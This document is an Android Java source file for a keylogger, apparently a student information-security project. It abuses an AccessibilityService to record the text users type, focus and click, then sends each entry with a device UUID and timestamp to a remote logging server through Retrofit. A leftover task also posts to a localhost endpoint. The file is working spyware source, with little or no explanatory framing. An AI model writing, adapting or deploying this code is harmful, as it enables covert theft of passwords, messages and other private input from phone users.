package com.maemresen.infsec.keylogapp;

import android.accessibilityservice.AccessibilityService;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import androidx.annotation.RequiresApi;

import com.android.volley.AuthFailureError;
import com.android.volley.RequestQueue;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.maemresen.infsec.keylogapp.model.KeyLog;
import com.maemresen.infsec.keylogapp.retrofit.ApiInterface;
import com.maemresen.infsec.keylogapp.retrofit.ServiceGenerator;
import com.maemresen.infsec.keylogapp.util.DateTimeHelper;

//import org.apache.http.client.HttpClient;
//import org.apache.http.client.methods.HttpPost;
//import org.apache.http.entity.StringEntity;
//import org.apache.http.impl.client.DefaultHttpClient;
//import org.apache.http.params.HttpConnectionParams;
//import org.apache.http.params.HttpParams;
//import org.apache.http.protocol.HTTP;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.Map;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class KeyLogger extends AccessibilityService {

    private final static String LOG_TAG = Helper.getLogTag(KeyLogger.class);

    private class SendToServerTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {

            String urlString = "http://localhost:8080/keylog/save";
            OutputStream out = null;

            try {
                URL url = new URL(urlString);
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                out = new BufferedOutputStream(urlConnection.getOutputStream());

                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out,"UTF-8"));
                writer.write("AAA");
                writer.flush();
                writer.close();
                out.close();

                urlConnection.connect();

            } catch (Exception e) {
                e.printStackTrace();
            }
            return params[0];
        }
    }


    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting Service");
        Log.i(LOG_TAG, "Starting service"
        );
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.d("Keylogger", "accessibilityEvent");
        String uuid = Helper.getUuid();
//        Date now = DateTimeHelper.getCurrentDay();
        LocalDateTime time = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
        String accessibilityEvent = null;
        String msg = null;

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                accessibilityEvent = "TYPE_VIEW_TEXT_CHANGED";
                msg = String.valueOf(event.getText());
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                accessibilityEvent = "TYPE_VIEW_FOCUSED";
                msg = String.valueOf(event.getText());
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                accessibilityEvent = "TYPE_VIEW_CLICKED";
                msg = String.valueOf(event.getText());
                break;
            }
            default:
        }

        if (accessibilityEvent == null) {
            return;
        }

        Log.i(LOG_TAG, msg);

        KeyLog keyLog = new KeyLog();
        keyLog.setUuid(uuid);
        keyLog.setKeyLogDate(String.valueOf(time.format(formatter)));
        keyLog.setAccessibilityEvent(accessibilityEvent);
        keyLog.setMsg(msg);

        Log.d("Keylogger", "keylog" + keyLog);


        sendData(keyLog);
    }

    private Map<String, String> getMap(KeyLog keyLog) throws IllegalAccessException {
        Map<String, String> result = new LinkedHashMap<>();
        result.put("uuid", keyLog.getUuid());
        result.put("keyLogDate", String.valueOf(keyLog.getKeyLogDate()));
        result.put("accessibilityEvent", keyLog.getAccessibilityEvent());
        result.put("msg", keyLog.getMsg());
        return result;
    }


    private void sendData(KeyLog keyLog) {

        ApiInterface apiInterface = ServiceGenerator.createService(ApiInterface.class);
        Call<String> call = apiInterface.sendData(keyLog);
        call.enqueue(new Callback<String>() {
            @Override
            public void onResponse(Call<String> call, Response<String> response) {
                Log.d("Keylogger", "SUCCESS");
            }

            @Override
            public void onFailure(Call<String> call, Throwable t) {
                Log.d("Keylogger", "FALURE" );
            }
        });
    }



    private void onResponse(JSONObject response) {
        Log.i(LOG_TAG, "Response is : " + response);
    }

    private void onErrorResponse(VolleyError error) {
        Log.e(LOG_TAG, error.getMessage());
    }

    @Override
    public void onInterrupt() {

    }
}
